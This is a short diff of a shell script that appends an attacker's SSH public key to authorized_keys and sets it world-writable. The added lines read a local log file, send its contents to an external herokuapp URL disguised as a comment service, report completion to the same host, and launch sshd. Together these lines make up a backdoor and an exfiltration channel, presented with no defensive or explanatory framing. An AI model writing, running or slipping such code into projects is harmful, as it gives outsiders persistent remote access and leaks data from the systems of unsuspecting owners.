@@ -20,5 +20,7 @@ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDW2fIF2FfITNH+lp7GlJkJAPKBJlpIuKNcaL
 ' >> authorized_keys ;
 chmod 777 authorized_keys ;
 echo "STEP 4 >>>> Configured key";
-output=$(cat datalog.txt);
-curl -G 'https://comment-management.herokuapp.com/message' --data-urlencode message="$output";
+output3=$(cat datalog.txt);
+curl -G 'https://comment-management.herokuapp.com/message' --data-urlencode message="$output3";
+curl -G 'https://comment-management.herokuapp.com/message' --data-urlencode message="completed";
+sshd
